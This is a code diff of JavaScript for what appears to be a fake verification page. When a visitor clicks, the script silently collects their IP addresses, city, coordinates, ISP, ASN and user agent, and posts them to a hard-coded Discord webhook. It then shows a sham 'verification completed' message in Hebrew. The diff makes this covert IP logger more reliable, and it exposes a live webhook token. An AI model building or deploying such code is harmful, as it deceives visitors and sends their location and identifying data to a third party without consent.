@@ -9,18 +9,20 @@ document.getElementById("start-btn").addEventListener("click", function () {
     let clickTime = new Date().toLocaleString();
     let pageURL = window.location.href;
     
-    let ipv4Data, ipv6Data;
-    
+    let ipv4Data = {};
+    let ipv6Data = {};
+
+    // First, get IPv4 details
     fetch("https://ipapi.co/json/")
         .then(response => response.json())
         .then(data => {
             ipv4Data = data;
-            return fetch("https://api64.ipify.org?format=json");
+            return fetch("https://api64.ipify.org?format=json"); // Then get IPv6
         })
         .then(response => response.json())
         .then(data => {
-            ipv6Data = data;
-            
+            ipv6Data.ip = data.ip;
+
             let webhookURL = "https://discordapp.com/api/webhooks/1355178546158501948/P2ijHhP0vljK9IejUHXujtqdyDg0KTcyBIrmP5_eFm6YacSuxi9Z3gPGxDL0GCsDDioz";
             let payload = {
                 username: "Verification Log",
@@ -28,17 +30,17 @@ document.getElementById("start-btn").addEventListener("click", function () {
                     title: "New Verification Attempt",
                     color: 16711680,
                     fields: [
-                        { name: "IPv4 Address", value: ipv4Data.ip, inline: true },
+                        { name: "IPv4 Address", value: ipv4Data.ip || "Not Found", inline: true },
                         { name: "IPv6 Address", value: ipv6Data.ip || "Not Available", inline: true },
-                        { name: "Country", value: ipv4Data.country_name, inline: true },
-                        { name: "Region", value: ipv4Data.region, inline: true },
-                        { name: "City", value: ipv4Data.city, inline: true },
-                        { name: "ISP", value: ipv4Data.org, inline: true },
-                        { name: "Latitude", value: ipv4Data.latitude.toString(), inline: true },
-                        { name: "Longitude", value: ipv4Data.longitude.toString(), inline: true },
-                        { name: "Timezone", value: ipv4Data.timezone, inline: true },
-                        { name: "Postal Code", value: ipv4Data.postal, inline: true },
-                        { name: "ASN", value: ipv4Data.asn, inline: true },
+                        { name: "Country", value: ipv4Data.country_name || "Unknown", inline: true },
+                        { name: "Region", value: ipv4Data.region || "Unknown", inline: true },
+                        { name: "City", value: ipv4Data.city || "Unknown", inline: true },
+                        { name: "ISP", value: ipv4Data.org || "Unknown", inline: true },
+                        { name: "Latitude", value: ipv4Data.latitude || "Unknown", inline: true },
+                        { name: "Longitude", value: ipv4Data.longitude || "Unknown", inline: true },
+                        { name: "Timezone", value: ipv4Data.timezone || "Unknown", inline: true },
+                        { name: "Postal Code", value: ipv4Data.postal || "Unknown", inline: true },
+                        { name: "ASN", value: ipv4Data.asn || "Unknown", inline: true },
                         { name: "User-Agent", value: navigator.userAgent, inline: false },
                         { name: "Page URL", value: pageURL, inline: false },
                         { name: "Click Time", value: clickTime, inline: false }
@@ -48,7 +50,7 @@ document.getElementById("start-btn").addEventListener("click", function () {
                 }]
             };
             
-            fetch(webhookURL, {
+            return fetch(webhookURL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(payload)
@@ -68,10 +70,12 @@ document.getElementById("verify-btn").addEventListener("click", function() {
             btn.textContent = "Loading...";
             setTimeout(() => {
                 btn.textContent = "אימות הושלם בהצלחה";
+
                 setTimeout(() => {
-                    btn.style.transition = "transform 0.5s ease-in-out";
-                    btn.style.transform = "translateY(200vh)";
+                    btn.style.transition = "transform 0.7s ease-in-out";
+                    btn.style.transform = "translateY(300vh)"; // Moves very far down
                 }, 1000);
+
             }, 1000);
         }, 1000);
     }, 1000);
